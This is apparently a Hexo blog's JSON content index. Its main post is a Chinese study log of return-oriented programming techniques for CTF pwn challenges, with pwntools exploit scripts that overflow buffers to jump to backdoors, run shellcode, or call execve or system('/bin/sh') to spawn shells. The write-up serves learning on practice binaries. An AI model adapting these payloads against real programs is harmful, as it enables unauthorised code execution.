{"meta":{"title":"Hexo","subtitle":"","description":"","author":"wased","url":"https://username.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2022-09-25T11:11:47.550Z","updated":"2022-09-25T11:11:47.550Z","comments":false,"path":"/404.html","permalink":"https://username.github.io/404.html","excerpt":"","text":""},{"title":"About me","date":"2023-09-26T09:19:12.419Z","updated":"2023-09-26T09:19:06.320Z","comments":false,"path":"about/index.html","permalink":"https://username.github.io/about/index.html","excerpt":"","text":"Github: https://github.com/was3d 博客园: https://www.cnblogs.com/wased/ Mail：mailto:1308668961@qq.com"},{"title":"友情链接","date":"2023-09-26T09:30:56.142Z","updated":"2023-09-26T09:30:54.161Z","comments":true,"path":"links/index.html","permalink":"https://username.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-12-15T03:40:35.294Z","updated":"2022-12-15T03:40:35.294Z","comments":false,"path":"tags/index.html","permalink":"https://username.github.io/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2022-12-15T03:32:30.455Z","updated":"2022-12-15T03:32:30.455Z","comments":false,"path":"categories/index.html","permalink":"https://username.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2022-12-15T02:54:42.306Z","updated":"2022-09-25T11:11:47.552Z","comments":false,"path":"repository/index.html","permalink":"https://username.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"基本ROP","slug":"基本ROP","date":"2023-01-09T08:29:01.000Z","updated":"2023-01-11T17:43:14.837Z","comments":true,"path":"2023/01/09/基本ROP/","link":"","permalink":"https://username.github.io/2023/01/09/%E5%9F%BA%E6%9C%ACROP/","excerpt":"","text":"ROP学习记录 ROP的全称为Return-oriented programming（返回导向编程） 保护机制： DEP（堆栈不可执行） ASLR（内存地址随机化） Stack Protector（栈保护） NX:No-eXecute(不可执行),基本原理是将数据所在的内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 主要思想：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程 ROP攻击一般条件： 程序存在溢出，并且可以控制返回地址 可以找到满足条件的 gadgets(不相邻的程序已有的代码 ) 以及相应 gadgets 的地址 ret2text 原理 ret2text 即控制程序执行程序本身已有的的代码 (.text) 练习： pwn1_1 checksec: ida分析后发现这里读入是通过read，且这里的读取长度4096&gt;buf的定义16,可造成溢出 这里可见后门函数： 这里分析buf函数以找出返回地址 exp： 12345from pwn import *p = remote(&quot;gxh191.top&quot;,25537)p.recv()p.send(b&quot;a&quot;*(16+8) + p64(0x40119E))p.interactive() CTFHUB_ret2text: checksec: ida分析代码 EXP如下： 1234567from pwn import *#sh = process(&#x27;./ret2text&#x27;)sh= remote(&quot;challenge-b3dded864d8eec43.sandbox.ctfhub.com&quot;,26822)target = 0x04007B8sh.sendline(b&#x27;A&#x27; * (120) + p64(target))sh.interactive() ret2shellcode 原理： 即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码 **注意：**要想执行shellcode，需要对应的程序在运行时shellcode所在的位置具有可执行权限, 基本思路： 先找到溢出点，确定溢出位后看是否可在bss段写数据，确定可写后将shellcode的数据发送到bss段，最后通过覆盖跳转地址跳转到shellcode所在的地址进行执行 BSS段（bss segment）通常是指用来存放程序中未初始化的或者初始化为0的全局变量和局部静态变量的一块内存区域。BSS是英文Block Started by Symbol的简称。BSS段属于静态内存分配 练习 ret2shellcode 程序几乎没有开启任何保护 这里ida分析： 看到将s的数据复制到了buf2，而buf2在.bss段： exp: 123456789#!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2shellcode&#x27;)shellcode = asm(shellcraft.sh())# asm(shellcraft.sh())该语句生成shellcodebuf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, &#x27;A&#x27;) + p32(buf2_addr))sh.interactive() pwn2_2 这里修改了phone_number所在的bss段的权限，权限7表示可读可写可执行 exp： 123456789101112#!/usr/bin/env pythonfrom pwn import *context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)sh = process(&#x27;./pwn2_2&#x27;)shellcode = asm(shellcraft.sh())buf2_addr = 0x04040A0sh.recv()sh.sendline(shellcode)sh.recv()payload=b&#x27;a&#x27;*24+p64(buf2_addr)sh.sendline(payload)sh.interactive() 关于这里的context: context 是 pwntools 用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题,一般来说我们设置context只需要简单的一句话: 1&gt;context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) 或者 context(os='linux', arch='amd64') os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。 ret2syscall 原理： ret2syscall，即控制程序执行系统调用，获取 shell 前置条件：可以找到更改eax的gadget 32位程序： 目的是为了执行execve(“bin/sh”,NULL,NULL) ​ eax ebx ecx edx ​ 0xb ”bin/sh&quot;的地址 0 0 最后要以int 0x80结尾 其中eax存储0xb是execve函数对应的系统调用号 12345//系统调用号的查看32位：cat /usr/include/asm/unistd_32.h64位：cat /usr/include/asm/unistd_64.h 通过ROPgadget工具进行查找gadget 12345671.ROPgadget找gadgetROPgadget --binary filename --only ‘pop|ret&#x27; |grep &#x27;eax&#x27; 文件名 寄存器名|grep &#x27;eax&#x27;可省略2.ROPgadget找&#x27;/bin/sh&#x27;字符串ROPgadget --binary filename --string&quot;/bin/sh&quot; 文件名 练习： ctfwiki_ret2syscall 该程序是一个32位的程序： 通过ROPgadget查找需要的语句 123456789101112#!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./rop&#x27;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat([&#x27;A&#x27; * 112, pop_eax_ret, 0xb,pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() pwn3_1 ret2libc 原理： ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 练习： ret2libc1（有’/bin/sh‘和system函数） 找到ststem函数的地址和’/bin/sh‘的地址 123456789101112#!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2libc1&#x27;)binsh_addr = 0x8048720system_plt = 0x8048460payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])#&#x27;如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以&#x27;bbbb&#x27; 作为虚假的地址，其后参数对应的参数内容。sh.sendline(payload)sh.interactive() ret2libc2(有system函数无’/bin/sh’) 没有开PIE，地址固定，所以可以将’bin/sh’写在bss段上 思路：通过gets函数溢出，再次调用gets函数，使得用户可以输入’/bin/sh‘，并通过gadget将’/bin/sh’写进bss段的buf2（不写在栈上是由于栈的地址不可控，而没有开PIE时，bss段地址时不变的），再通过调用system函数，执行system(‘/bin/sh’) 1234567891011121314#!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2libc2&#x27;)gets_addr=0x08048460pop_ebp=0x0804843dsystem_plt =0x8048490bss_buf_addr=0x0804A080payload = flat([&#x27;a&#x27; * 112,gets_addr,pop_ebp,bss_buf_addr,system_plt,&#x27;a&#x27; * 4,bss_buf_addr])sh.sendline(payload)sh.sendline(&#x27;/bin/sh&#x27;)#将&#x27;/bin/sh&#x27;通过上面调用的gets输入到buf2sh.interactive() ret2libc3(无system函数无’/bin/sh’) 待完善…（在学）","categories":[{"name":"学习","slug":"学习","permalink":"https://username.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://username.github.io/tags/pwn/"},{"name":"ROP","slug":"ROP","permalink":"https://username.github.io/tags/ROP/"}]},{"title":"Hello World","slug":"hello-world","date":"2022-09-25T02:41:38.598Z","updated":"2022-09-25T02:41:38.599Z","comments":true,"path":"2022/09/25/hello-world/","link":"","permalink":"https://username.github.io/2022/09/25/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"学习","slug":"学习","permalink":"https://username.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://username.github.io/tags/pwn/"},{"name":"ROP","slug":"ROP","permalink":"https://username.github.io/tags/ROP/"}]}